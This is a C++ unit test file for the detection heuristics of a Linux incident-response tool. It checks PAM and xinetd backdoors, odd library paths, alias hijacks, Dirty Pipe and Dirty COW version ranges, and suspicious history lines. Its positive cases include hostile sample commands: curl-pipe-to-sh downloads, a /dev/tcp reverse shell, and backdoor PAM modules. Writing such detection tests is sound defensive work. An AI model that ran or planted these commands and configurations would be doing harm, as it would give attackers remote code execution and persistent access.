#include "test_macros.hpp"
#include "core/lnx_heuristics.hpp"

using namespace ctfir;

CTFIR_TEST(pam_short_names_not_backdoor) {
    CHECK(!pam_line_is_backdoor("auth\tsufficient\tpam_rootok.so"));
    CHECK(!pam_line_is_backdoor("auth       required   pam_shells.so"));
    CHECK(!pam_line_is_backdoor("account	[success=1 new_authtok_reqd=done default=ignore]	pam_unix.so"));
    CHECK(!pam_line_is_backdoor("auth	requisite			pam_deny.so"));
    CHECK(!pam_line_is_backdoor("auth	required			pam_permit.so"));
    CHECK(!pam_line_is_backdoor("auth	optional			pam_cap.so"));
    CHECK(!pam_line_is_backdoor("session required pam_systemd.so"));
    CHECK(!pam_line_is_backdoor("password sufficient pam_unix.so sha512 shadow nullok try_first_pass use_authtok"));
    CHECK(!pam_line_is_backdoor("# auth required pam_exec.so /tmp/x.sh"));
    CHECK(!pam_line_is_backdoor("auth required /lib64/security/pam_unix.so"));
    CHECK(!pam_line_is_backdoor("auth required /usr/lib/x86_64-linux-gnu/security/pam_unix.so"));
}

CTFIR_TEST(pam_real_backdoors) {
    CHECK(pam_line_is_backdoor("auth required pam_exec.so /tmp/ctfir-marker-pam.sh"));
    CHECK(pam_line_is_backdoor("session optional pam_exec.so seteuid /usr/local/bin/hook"));
    CHECK(pam_line_is_backdoor("auth required /tmp/evil.so"));
    CHECK(pam_line_is_backdoor("auth required /usr/local/lib/pam_backdoor.so"));
    CHECK(pam_line_is_backdoor("auth required evil.so"));
    CHECK(pam_line_is_backdoor("session required /dev/shm/x.so"));
}

CTFIR_TEST(ldso_debian_defaults_ok) {
    CHECK(!ldso_path_is_unusual("/usr/local/lib/x86_64-linux-gnu"));
    CHECK(!ldso_path_is_unusual("/lib/x86_64-linux-gnu"));
    CHECK(!ldso_path_is_unusual("/usr/lib/x86_64-linux-gnu"));
    CHECK(!ldso_path_is_unusual("/usr/local/lib"));
    CHECK(!ldso_path_is_unusual("/lib64"));
    CHECK(!ldso_path_is_unusual("# comment"));
    CHECK(ldso_path_is_unusual("/tmp/ctfir-marker-lib"));
    CHECK(ldso_path_is_unusual("/home/evil/lib"));
    CHECK(ldso_path_is_unusual("relative/path"));
}

CTFIR_TEST(dirtypipe_range_only_5_8_to_5_16_11) {
    CHECK(!dirtypipe_version_affected(6, 6, 87));
    CHECK(!dirtypipe_version_affected(5, 4, 0));
    CHECK(dirtypipe_version_affected(5, 8, 0));
    CHECK(dirtypipe_version_affected(5, 16, 11));
    CHECK(!dirtypipe_version_affected(5, 16, 12));
    CHECK(!dirtypipe_version_affected(5, 17, 0));
    CHECK(dirtycow_version_affected(3, 10, 0));
    CHECK(dirtycow_version_affected(4, 8, 2));
    CHECK(!dirtycow_version_affected(4, 8, 3));
    CHECK(!dirtycow_version_affected(6, 6, 0));
}

CTFIR_TEST(caps_and_proc_wrappers) {
    CHECK(cap_name_expected("ping"));
    CHECK(cap_name_expected("ping4"));
    CHECK(cap_name_expected("ping6"));
    CHECK(cap_name_expected("newgidmap"));
    CHECK(cap_name_expected("arping"));
    CHECK(cap_name_expected("suexec"));
    CHECK(cap_name_expected("mtr"));
    CHECK(!cap_name_expected("ctfir-marker-cap"));
    CHECK(proc_claimed_matches_exe("pipewire-pulse", "pipewire"));
    CHECK(proc_claimed_matches_exe("pipewire", "pipewire"));
    CHECK(proc_claimed_matches_exe("-bash", "bash"));
    CHECK(!proc_claimed_matches_exe("kworkerd", "sleep"));
    CHECK(proc_claimed_matches_exe("app.py", "python3"));
    CHECK(proc_claimed_matches_exe("sh", "bash"));
    CHECK(proc_claimed_matches_exe("sh", "dash"));
    CHECK(proc_claimed_matches_exe("-sh", "bash"));
    CHECK(!proc_claimed_matches_exe("kworkerd", "bash"));
    CHECK(camouflage_doc_ext(".pdf"));
    CHECK(camouflage_doc_ext(".docx"));
    CHECK(!camouflage_doc_ext(".svc"));
    CHECK(!camouflage_doc_ext(".3"));
}

CTFIR_TEST(history_curl_google_is_noise) {
    CHECK(!history_line_is_clue("curl https://www.google.com"));
    CHECK(!history_line_is_clue("curl https://github.com/Monody12/FocusTime.git"));
    CHECK(history_line_is_clue("curl http://10.1.1.1/a.sh | sh"));
    CHECK(history_line_is_clue("wget -O /tmp/x http://example.com/x"));
    CHECK(history_line_is_clue("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
    CHECK(history_line_is_clue("chmod 777 /tmp/a"));
}

CTFIR_TEST(profile_alias_hijack) {
    CHECK(profile_alias_is_hijack("alias ssh='ctfir-marker'"));
    CHECK(profile_alias_is_hijack("alias ls=\"curl http://127.0.0.1/x | sh\""));
    CHECK(profile_alias_is_hijack("alias sudo='/tmp/sudo'"));
    CHECK(!profile_alias_is_hijack("alias ls='ls --color=auto'"));
    CHECK(!profile_alias_is_hijack("alias ll='ls -l'"));
    CHECK(!profile_alias_is_hijack("alias grep='grep --color'"));
    CHECK(!profile_alias_is_hijack("# alias ssh='x'"));
}

CTFIR_TEST(initd_backdoor_lines) {
    CHECK(initd_line_is_backdoor("curl http://10.1.1.1/x | sh"));
    CHECK(initd_line_is_backdoor("wget -O /tmp/x http://x"));
    CHECK(!initd_line_is_backdoor("PIDFILE=/var/run/sshd.pid"));
    CHECK(!initd_line_is_backdoor("lockfile=/var/lock/subsys/httpd"));
    CHECK(!initd_line_is_backdoor("# curl http://x"));
}

CTFIR_TEST(xinetd_backdoor_lines) {
    CHECK(xinetd_line_is_backdoor("server = /tmp/ctfir-marker-xinetd"));
    CHECK(xinetd_line_is_backdoor("server_args = bash -i"));
    CHECK(!xinetd_line_is_backdoor("server = /usr/sbin/sshd"));
    CHECK(!xinetd_line_is_backdoor("# server = /tmp/x"));
}

CTFIR_TEST(dirtypipe_fixed_stable_boundaries) {
    CHECK(dirtypipe_version_affected(5, 10, 101));
    CHECK(!dirtypipe_version_affected(5, 10, 102));
    CHECK(!dirtypipe_version_affected(5, 10, 200));
    CHECK(dirtypipe_version_affected(5, 15, 24));
    CHECK(!dirtypipe_version_affected(5, 15, 25));
    CHECK(!dirtypipe_version_affected(5, 15, 99));
    CHECK(!dirtypipe_version_affected(4, 19, 0));
}

CTFIR_TEST(ldso_directory_prefix_boundaries) {
    CHECK(ldso_path_is_unusual("/usr/libevil"));
    CHECK(ldso_path_is_unusual("/library/evil"));
    CHECK(ldso_path_is_unusual("/usr/local/library/evil"));
    CHECK(!ldso_path_is_unusual("/lib64/normal"));
    CHECK(!ldso_path_is_unusual("   # ignored"));
    CHECK(!initd_line_is_backdoor("   # bash -i"));
    CHECK(!xinetd_line_is_backdoor("   # server = /tmp/x"));
    CHECK(!pam_line_is_backdoor("   "));
}
